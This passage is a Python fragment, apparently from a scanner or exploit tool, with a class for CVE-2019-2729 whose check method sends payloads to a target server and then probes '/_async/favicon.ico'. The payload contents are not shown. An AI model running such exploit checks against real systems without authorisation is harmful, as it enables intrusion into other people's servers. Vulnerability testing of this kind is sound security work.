...
class CVE_2019_2729(object):
    def __init__(self, url):
        self.url = url

    def check(self):
        r = requests.post(self.url + path, headers=headers, data=payload, timeout=3)
        r2 = requests.post(self.url + path1, headers=headers, data=payload2, timeout=3)
        r3 = requests.get(self.url + '/_async/favicon.ico')
